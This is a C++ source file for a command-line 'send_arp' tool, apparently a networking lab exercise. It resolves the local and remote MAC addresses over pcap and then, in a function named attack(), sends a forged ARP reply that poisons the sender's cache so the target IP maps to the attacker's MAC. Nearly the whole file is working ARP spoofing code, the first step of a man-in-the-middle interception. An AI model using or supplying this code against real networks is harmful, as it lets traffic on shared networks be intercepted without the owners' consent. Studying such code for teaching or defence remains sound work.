#include "arp.h"

void usage()
{
    printf("\nusage   : send_arp <interface> <sender ip> <target ip>");
    printf("\nexample : send_arp eth0 192.168.0.11 192.168.0.1\n\n");
}

void print_mac(const char *msg, uint8_t* mac)
{
    printf("[+]Success to get %s's MAC address..\n", msg);
    printf("MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int GetSvrMacAddress(AddressInfo *addressinfo)
{
    int nSD; // Socket descriptor
    struct ifreq *ifr; // Interface request
    struct ifconf ifc;
    char ipstr[40];
    int i, numif;

    memset(&ifc, 0, sizeof(ifc));
    ifc.ifc_ifcu.ifcu_req = nullptr;
    ifc.ifc_len = 0;

    // Create a socket that we can use for all of our ioctls
    nSD = socket( PF_INET, SOCK_DGRAM, 0 );
    if ( nSD < 0 )  return 0;
    if(ioctl(nSD, SIOCGIFCONF, &ifc) < 0) return 0;
    if ((ifr = reinterpret_cast<ifreq*>(malloc(ifc.ifc_len))) == nullptr)
        return 0;
    else
    {
        ifc.ifc_ifcu.ifcu_req = ifr;
        if (ioctl(nSD, SIOCGIFCONF, &ifc) < 0)
            return 0;

        numif = ifc.ifc_len / sizeof(struct ifreq);

        for (i = 0; i < numif; i++)
        {
            struct ifreq *r = &ifr[i];
            struct sockaddr_in *sin = reinterpret_cast<struct sockaddr_in *>(&r->ifr_addr);
            if (!strcmp(r->ifr_name, addressinfo->interface))
            {
                inet_ntop(AF_INET, r->ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
                addressinfo->hostIP = inet_addr(ipstr);
                if(ioctl(nSD, SIOCGIFHWADDR, r) < 0)
                {
                    if(nSD) close(nSD);
                    if(ifr) free(ifr);
                    return 0;
                }
                memcpy(addressinfo->hostMac, r->ifr_hwaddr.sa_data, 6);
                if(nSD) close(nSD);
                if(ifr) free(ifr);
                return 1;
            }
        }
    }
    close(nSD);
    free(ifr);

    return( 0 );
}

int GetTargetMacAddress(AddressInfo *addressinfo)
{
    ARP_Packet *arpPacket;
    char errbuf[PCAP_ERRBUF_SIZE];

    arpPacket = reinterpret_cast<ARP_Packet*>(malloc(sizeof(ARP_Packet)));
    SetARPPacket(arpPacket, ARP_REQUEST, addressinfo);

    pcap_t* handle = pcap_open_live(addressinfo->interface, BUFSIZ, 1, 1000, errbuf);
    pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);

    int count = 0;
    while (true)
    {
        count++;
        struct pcap_pkthdr* header;
        const u_char* packet;
        const ARP_Packet *p;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        p = reinterpret_cast<const ARP_Packet*>(packet);
        if(p->eth_type == htons(0x0806))
            if(memcmp(arpPacket->dstProtocolAddr ,p->srcProtocolAddr, IP_ADDR_LEN) == 0)
            {
                memcpy(addressinfo->senderMac, p->srcMACAddr, MAC_ADDR_LEN);
                break;
            }
        if(count >10000)
        {
            if (arpPacket)
                free(arpPacket);
            if (handle)
                pcap_close(handle);
            return 0;
        }
    }
    if (arpPacket)
        free(arpPacket);
    pcap_close(handle);
    return 1;
}

void SetARPPacket(ARP_Packet *packet, uint16_t opcode, AddressInfo *addressinfo)
{
    packet->eth_type = htons(0x0806);
    packet->hardwareType = htons(0x01);
    packet->protocolType = htons(0x0800);
    packet->hardAddLen = 6;
    packet->protoAddLen = 4;
    packet->operationCode = htons(opcode);

    switch(opcode)
    {
    case ARP_REQUEST:
        memcpy(packet->eth_src, addressinfo->hostMac, MAC_ADDR_LEN);
        memset(packet->eth_dst, 0xff, MAC_ADDR_LEN);
        memcpy(packet->srcMACAddr, addressinfo->hostMac, MAC_ADDR_LEN);
        memcpy(packet->srcProtocolAddr, &addressinfo->hostIP, IP_ADDR_LEN);
        memset(packet->dstMACAddr, 0x00, MAC_ADDR_LEN);
        memcpy(packet->dstProtocolAddr, &addressinfo->senderIp, IP_ADDR_LEN);
        break;
    case ARP_REPLY:
        memcpy(packet->eth_src, addressinfo->hostMac, MAC_ADDR_LEN);
        memcpy(packet->eth_dst, addressinfo->senderMac, MAC_ADDR_LEN);
        memcpy(packet->srcMACAddr, addressinfo->hostMac, MAC_ADDR_LEN);
        memcpy(packet->srcProtocolAddr, &addressinfo->targetIp, IP_ADDR_LEN);
        memcpy(packet->dstMACAddr, addressinfo->senderMac, MAC_ADDR_LEN);
        memcpy(packet->dstProtocolAddr, &addressinfo->senderIp, IP_ADDR_LEN);
        break;
    }
}

void attack(AddressInfo *addressinfo)
{
    ARP_Packet *arpPacket;
    char errbuf[PCAP_ERRBUF_SIZE];

    arpPacket = reinterpret_cast<ARP_Packet*>(malloc(sizeof(ARP_Packet)));
    SetARPPacket(arpPacket, ARP_REPLY, addressinfo);

    pcap_t* handle = pcap_open_live(addressinfo->interface, BUFSIZ, 1, 1000, errbuf);
    pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
    pcap_close(handle);

}
